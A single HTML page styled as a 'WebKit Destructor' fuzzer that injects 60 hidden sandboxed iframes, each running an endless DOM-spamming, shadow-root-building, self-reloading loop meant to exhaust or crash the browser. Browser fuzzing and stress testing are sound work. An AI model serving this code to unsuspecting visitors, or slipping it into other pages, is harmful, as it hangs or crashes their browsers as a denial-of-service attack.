<!DOCTYPE html>
<html>
<head>
  <title>🔥 WebKit Destructor</title>
  <style>
    body {
      background: black;
      color: #0f0;
      font-family: monospace;
    }
    #log {
      white-space: pre-wrap;
      font-size: 14px;
      padding: 1em;
    }
    iframe {
      display: none;
    }
  </style>
</head>
<body>
  <div id="log">[+] Launching destructo-fuzzer...</div>

  <script>
    const log = msg => {
      const el = document.getElementById("log");
      el.textContent += msg + "\n";
      el.scrollTop = el.scrollHeight;
    };

    const iframePayload = `
<!DOCTYPE html>
<html>
  <body style='background:black; color:#0f0; font-family:monospace;'>
    <script>
      let f = 0;

      function spamDOM() {
        try {
          for (let i = 0; i < 5000; i++) {
            const d = document.createElement("div");
            d.textContent = "SPAM_" + f + "_" + i;
            const s = d.attachShadow({ mode: "open" });
            for (let j = 0; j < 100; j++) {
              const span = document.createElement("span");
              span.textContent = "X" + j;
              s.appendChild(span);
            }
            document.body.appendChild(d);
          }

          if (Math.random() < 0.5) document.body.innerHTML = "<h1>BOOM</h1>";
          if (Math.random() < 0.4) while (Math.random() < 0.95) document.body.appendChild(document.createElement("p"));
          if (Math.random() < 0.2) location.reload();

          if (typeof gc === "function") gc();
        } catch (e) {}
      }

      function destructiveLoop() {
        let i = 0;
        function burn() {
          i++;
          spamDOM();
          if (i % 3 === 0) requestAnimationFrame(burn);
          else setTimeout(burn, 0);
        }
        burn();
      }

      new MutationObserver(() => {
        if (Math.random() < 0.5) document.body.innerHTML = "<marquee>💀</marquee>";
      }).observe(document.body, { childList: true, subtree: true });

      destructiveLoop();
    <\/script>
  </body>
</html>
`.trim();

    const TOTAL_IFRAMES = 60;
    let count = 0;

    function injectNext() {
      if (count >= TOTAL_IFRAMES) return;
      const iframe = document.createElement("iframe");
      iframe.setAttribute("sandbox", "allow-scripts");
      iframe.srcdoc = iframePayload;
      document.body.appendChild(iframe);
      log("[+] Destructor iframe " + count + " injected");
      count++;
      setTimeout(injectNext, 200); // más rápido
    }

    injectNext();
  </script>
</body>
</html>
